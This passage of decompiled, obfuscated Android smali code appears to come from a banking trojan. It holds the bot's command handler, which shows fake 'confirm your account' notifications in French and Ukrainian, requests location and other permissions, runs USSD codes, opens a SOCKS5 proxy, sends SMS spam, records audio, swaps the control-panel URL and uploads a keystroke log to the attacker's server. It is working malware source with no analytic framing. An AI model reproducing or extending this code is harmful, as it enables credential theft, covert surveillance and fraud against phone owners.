    const-string v10, "Confirmez votre compte"

    goto :goto_17

    :cond_30
    const-string v10, "UA"

    invoke-virtual {v9, v10}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v9

    if-eqz v9, :cond_2b

    const-string v9, "\u0422\u0435\u0440\u043c\u0456\u043d\u043e\u0432\u0435 \u043f\u043e\u0432\u0456\u0434\u043e\u043c\u043b\u0435\u043d\u043d\u044f!"

    const-string v10, "\u041f\u0456\u0434\u0442\u0432\u0435\u0440\u0434\u044c\u0442\u0435 \u0441\u0432\u0456\u0439 \u0440\u0430\u0445\u0443\u043d\u043e\u043a"

    :goto_17
    new-instance v11, Landroid/content/Intent;

    const-class v12, Lwocwvy/czyxoxmbauu/slsa/nepgaqmyfrhw;

    invoke-direct {v11, v1, v12}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v12, "appname"

    invoke-virtual {v11, v12, v5}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v5

    const-string v11, "title"

    invoke-virtual {v5, v11, v9}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v5

    const-string v9, "text"

    invoke-virtual {v5, v9, v10}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v5

    invoke-virtual {v1, v5}, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_10
    .catch Ljava/lang/Exception; {:try_start_10 .. :try_end_10} :catch_f

    goto :goto_18

    :catch_f
    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v9, "ukhakhcgifofl"

    const-string v10, "ERROR -> startAutoPush"

    invoke-virtual {v5, v9, v10}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    :cond_31
    :goto_18
    aget-object v5, v3, v4

    const-string v9, "RequestPermissionInj"

    invoke-virtual {v5, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_32

    sget v5, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v9, 0x18

    if-lt v5, v9, :cond_33

    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v10, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->d:Landroid/content/Context;

    invoke-virtual {v5, v10}, Lwocwvy/czyxoxmbauu/slsa/b;->h(Landroid/content/Context;)Z

    move-result v5

    if-nez v5, :cond_33

    new-instance v5, Landroid/content/Intent;

    const-class v10, Lwocwvy/czyxoxmbauu/slsa/ncec/dzudmx;

    invoke-direct {v5, v1, v10}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v10, "start"

    const-string v11, "statistic"

    invoke-virtual {v5, v10, v11}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v5

    invoke-virtual {v5, v8}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v5, v7}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v1, v5}, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->startActivity(Landroid/content/Intent;)V

    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v10, "\u0412\u044b\u043f \u043d\u0430\u0441\u0442\u0440"

    const-string v11, "/PROC 7.0 "

    invoke-virtual {v5, v10, v11}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_19

    :cond_32
    const/16 v9, 0x18

    :cond_33
    :goto_19
    aget-object v5, v3, v4

    const-string v10, "RequestPermissionGPS"

    invoke-virtual {v5, v10}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_34

    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v10, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->d:Landroid/content/Context;

    invoke-virtual {v5, v10}, Lwocwvy/czyxoxmbauu/slsa/b;->k(Landroid/content/Context;)Z

    move-result v5

    if-nez v5, :cond_34

    new-instance v5, Landroid/content/Intent;

    const-class v10, Lwocwvy/czyxoxmbauu/slsa/ncec/dzudmx;

    invoke-direct {v5, v1, v10}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v10, "start"

    const-string v11, "gps"

    invoke-virtual {v5, v10, v11}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v5

    invoke-virtual {v5, v8}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v5, v7}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v1, v5}, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->startActivity(Landroid/content/Intent;)V

    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v10, "\u0412\u044b\u043f \u043d\u0430\u0441\u0442\u0440"

    const-string v11, "\u0417\u0430\u043f\u0440\u043e\u0441 \u0433\u0435\u043e\u043b\u043e\u043a\u0430\u0446\u0438\u0438"

    invoke-virtual {v5, v10, v11}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    :cond_34
    aget-object v5, v3, v4

    const-string v10, "|ussd="

    invoke-virtual {v5, v10}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_35

    :try_start_11
    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    aget-object v10, v3, v4

    const-string v11, "|ussd="

    const-string v12, "|endUssD"

    invoke-virtual {v5, v10, v11, v12}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    iget-object v10, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v11, "USSD"

    invoke-virtual {v10, v11, v5}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    new-instance v10, Landroid/content/Intent;

    const-class v11, Lwocwvy/czyxoxmbauu/slsa/ncec/gcmysyhtova;

    invoke-direct {v10, v1, v11}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v11, "str"

    invoke-virtual {v10, v11, v5}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v5

    invoke-virtual {v5, v8}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v5, v7}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v1, v5}, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->startActivity(Landroid/content/Intent;)V
    :try_end_11
    .catch Ljava/lang/Exception; {:try_start_11 .. :try_end_11} :catch_10

    goto :goto_1a

    :catch_10
    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v10, "ERROR"

    const-string v11, "USSD -> Commands"

    invoke-virtual {v5, v10, v11}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    :cond_35
    :goto_1a
    aget-object v5, v3, v4

    const-string v10, "|sockshost="

    invoke-virtual {v5, v10}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_36

    :try_start_12
    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    aget-object v10, v3, v4

    const-string v11, "|sockshost="

    const-string v12, "|user="

    invoke-virtual {v5, v10, v11, v12}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    iget-object v10, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    aget-object v11, v3, v4

    const-string v12, "|user="

    const-string v13, "|pass="

    invoke-virtual {v10, v11, v12, v13}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    iget-object v11, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    aget-object v12, v3, v4

    const-string v13, "|pass="

    const-string v14, "|port="

    invoke-virtual {v11, v12, v13, v14}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    iget-object v12, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    aget-object v13, v3, v4

    const-string v14, "|port="

    const-string v15, "|endssh"

    invoke-virtual {v12, v13, v14, v15}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    new-instance v13, Landroid/content/Intent;

    const-class v14, Lwocwvy/czyxoxmbauu/slsa/kuv/sfswwunyakpjr;

    invoke-direct {v13, v1, v14}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v14, "host"

    new-instance v15, Ljava/lang/StringBuilder;

    invoke-direct {v15}, Ljava/lang/StringBuilder;-><init>()V

    const-string v9, ""

    invoke-virtual {v15, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v13, v14, v5}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v5

    const-string v9, "user"

    new-instance v13, Ljava/lang/StringBuilder;

    invoke-direct {v13}, Ljava/lang/StringBuilder;-><init>()V

    const-string v14, ""

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v13, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v13}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v5, v9, v10}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v5

    const-string v9, "pass"

    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V

    const-string v13, ""

    invoke-virtual {v10, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v5, v9, v10}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v5

    const-string v9, "port"

    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V

    const-string v11, ""

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v5, v9, v10}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v5

    invoke-virtual {v1, v5}, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_12
    .catch Ljava/lang/Exception; {:try_start_12 .. :try_end_12} :catch_11

    goto :goto_1b

    :catch_11
    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v9, "ERROR"

    const-string v10, "Socks5 -> Commands"

    invoke-virtual {v5, v9, v10}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    :cond_36
    :goto_1b
    aget-object v5, v3, v4

    const-string v9, "stopsocks5"

    invoke-virtual {v5, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_37

    :try_start_13
    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v9, "socks"

    const-string v10, "stop"

    invoke-virtual {v5, v1, v9, v10}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_13
    .catch Ljava/lang/Exception; {:try_start_13 .. :try_end_13} :catch_12

    goto :goto_1c

    :catch_12
    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v9, "ERROR"

    const-string v10, "stop Socks5 -> Commands"

    invoke-virtual {v5, v9, v10}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    :cond_37
    :goto_1c
    aget-object v5, v3, v4

    const-string v9, "|spam="

    invoke-virtual {v5, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_38

    :try_start_14
    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    aget-object v9, v3, v4

    const-string v10, "|spam="

    const-string v11, "|endspam"

    invoke-virtual {v5, v9, v10, v11}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    iget-object v9, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v10, "spam"

    invoke-virtual {v9, v10, v5}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    iget-object v9, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v10, "textSPAM"

    invoke-virtual {v9, v1, v10, v5}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v9, "spamSMS"

    const-string v10, "start"

    invoke-virtual {v5, v1, v9, v10}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v9, "indexSMSSPAM"

    const-string v10, ""

    invoke-virtual {v5, v1, v9, v10}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_14
    .catch Ljava/lang/Exception; {:try_start_14 .. :try_end_14} :catch_13

    goto :goto_1d

    :catch_13
    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v9, "ERROR"

    const-string v10, "spam -> Commands"

    invoke-virtual {v5, v9, v10}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    :cond_38
    :goto_1d
    aget-object v5, v3, v4

    const-string v9, "|recordsound="

    invoke-virtual {v5, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_39

    :try_start_15
    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    aget-object v9, v3, v4

    const-string v10, "|recordsound="

    const-string v11, "|endrecord"

    invoke-virtual {v5, v9, v10, v11}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    iget-object v9, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v10, "seconds"

    invoke-virtual {v9, v10, v5}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    iget-object v9, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v10, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->c:Lwocwvy/czyxoxmbauu/slsa/a;

    iget-object v10, v10, Lwocwvy/czyxoxmbauu/slsa/a;->g:[Ljava/lang/String;

    const/4 v11, 0x0

    aget-object v10, v10, v11

    invoke-virtual {v9, v1, v10}, Lwocwvy/czyxoxmbauu/slsa/b;->c(Landroid/content/Context;Ljava/lang/String;)Z

    move-result v9

    if-eqz v9, :cond_39

    iget-object v9, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-class v10, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;

    invoke-virtual {v9, v1, v10}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v9

    if-nez v9, :cond_39

    iget-object v9, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->d:Landroid/content/Context;

    new-instance v10, Landroid/content/Intent;

    iget-object v11, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->d:Landroid/content/Context;

    const-class v12, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;

    invoke-direct {v10, v11, v12}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v11, "time"

    invoke-virtual {v10, v11, v5}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v5

    invoke-virtual {v9, v5}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_15
    .catch Ljava/lang/Exception; {:try_start_15 .. :try_end_15} :catch_14

    goto :goto_1e

    :catch_14
    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v9, "ERROR"

    const-string v10, "RecodrSound -> Commands"

    invoke-virtual {v5, v9, v10}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    :cond_39
    :goto_1e
    aget-object v5, v3, v4

    const-string v9, "|replaceurl="

    invoke-virtual {v5, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_3a

    :try_start_16
    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    aget-object v9, v3, v4

    const-string v10, "|replaceurl="

    const-string v11, "|endurl"

    invoke-virtual {v5, v9, v10, v11}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    iget-object v9, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v10, "Replace URL Panel"

    invoke-virtual {v9, v10, v5}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    iget-object v9, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v10, "url"

    invoke-virtual {v9, v1, v10, v5}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v9, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v10, "urls"

    invoke-virtual {v9, v1, v10, v5}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_16
    .catch Ljava/lang/Exception; {:try_start_16 .. :try_end_16} :catch_15

    goto :goto_1f

    :catch_15
    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v9, "ERROR"

    const-string v10, "ReplaceURL -> Commands"

    invoke-virtual {v5, v9, v10}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    :cond_3a
    :goto_1f
    aget-object v5, v3, v4

    const-string v9, "|startapplication="

    invoke-virtual {v5, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_3b

    :try_start_17
    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    aget-object v9, v3, v4

    const-string v10, "|startapplication="

    const-string v11, "|endapp"

    invoke-virtual {v5, v9, v10, v11}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    iget-object v9, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v10, "Start App"

    invoke-virtual {v9, v10, v5}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual/range {p0 .. p0}, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v9

    invoke-virtual {v9, v5}, Landroid/content/pm/PackageManager;->getLaunchIntentForPackage(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v5

    invoke-virtual {v1, v5}, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->startActivity(Landroid/content/Intent;)V
    :try_end_17
    .catch Ljava/lang/Exception; {:try_start_17 .. :try_end_17} :catch_16

    goto :goto_20

    :catch_16
    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v9, "ERROR"

    const-string v10, "Start App -> Commands"

    invoke-virtual {v5, v9, v10}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    :cond_3b
    :goto_20
    aget-object v5, v3, v4

    const-string v9, "killBot"

    invoke-virtual {v5, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_3c

    :try_start_18
    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v9, "url"

    const-string v10, ""

    invoke-virtual {v5, v1, v9, v10}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v9, "urls"

    const-string v10, ""

    invoke-virtual {v5, v1, v9, v10}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v9, "urlInj"

    const-string v10, ""

    invoke-virtual {v5, v1, v9, v10}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    new-instance v5, Landroid/content/Intent;

    const-class v9, Lwocwvy/czyxoxmbauu/slsa/wfveenegvz;

    invoke-direct {v5, v1, v9}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v1, v5}, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->stopService(Landroid/content/Intent;)Z
    :try_end_18
    .catch Ljava/lang/Exception; {:try_start_18 .. :try_end_18} :catch_17

    goto :goto_21

    :catch_17
    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v9, "ERROR"

    const-string v10, "killBot -> Commands"

    invoke-virtual {v5, v9, v10}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    :cond_3c
    :goto_21
    aget-object v5, v3, v4

    const-string v9, "getkeylogger"

    invoke-virtual {v5, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_3d

    :try_start_19
    const-string v5, "keys.log"

    invoke-virtual {v1, v5}, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    const-string v9, "|^|"

    const-string v10, "\n"

    invoke-virtual {v5, v9, v10}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v5

    iget-object v9, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v10, "12"

    new-instance v11, Ljava/lang/StringBuilder;

    invoke-direct {v11}, Ljava/lang/StringBuilder;-><init>()V

    const-string v12, "p="

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v12, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    new-instance v13, Ljava/lang/StringBuilder;

    invoke-direct {v13}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v14, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-virtual {v14, v1}, Lwocwvy/czyxoxmbauu/slsa/b;->q(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v14, "~~~~~~~~~~"

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v13, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v13}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v12, v5}, Lwocwvy/czyxoxmbauu/slsa/b;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v11, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v9, v1, v10, v5}, Lwocwvy/czyxoxmbauu/slsa/b;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    const-string v9, "SEND KEL"

    const-string v10, "LOGER"

    invoke-static {v9, v10}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v9, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-virtual {v9, v5}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    const-string v9, "clear"

